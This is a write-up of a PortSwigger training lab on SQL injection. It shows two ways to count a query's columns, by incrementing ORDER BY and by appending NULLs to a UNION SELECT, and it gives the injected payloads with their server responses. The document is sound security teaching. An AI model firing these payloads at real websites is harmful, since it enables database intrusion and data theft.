# Lab 03 — SQL injection UNION attack, determining the number of columns returned by the query

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

**Entry point:** `GET /filter?category=`

## Goal

Perform a UNION attack that returns an extra row containing the value `NULL`
in every column — proving you know the exact column count.

## Solution

Two standard methods; both work here.

### Method 1 — `ORDER BY` increment

Inject with incrementing column index until the server errors:

```
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--    ← 200 OK
'+ORDER+BY+4--    ← 500 Internal Server Error
```

The error at 4 means the query returns **3 columns**.

### Method 2 — `UNION SELECT` with NULLs

Append NULLs until the response is OK:

```
'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--    ← 200 OK → 3 columns
```

### Final payload

```
'+UNION+SELECT+NULL,NULL,NULL--
```

The response contains an extra row of empty/NULL values — lab solved.

## Notes

`NULL` is used because it matches **every** column data type, so it never
causes a type-conversion error during column counting.
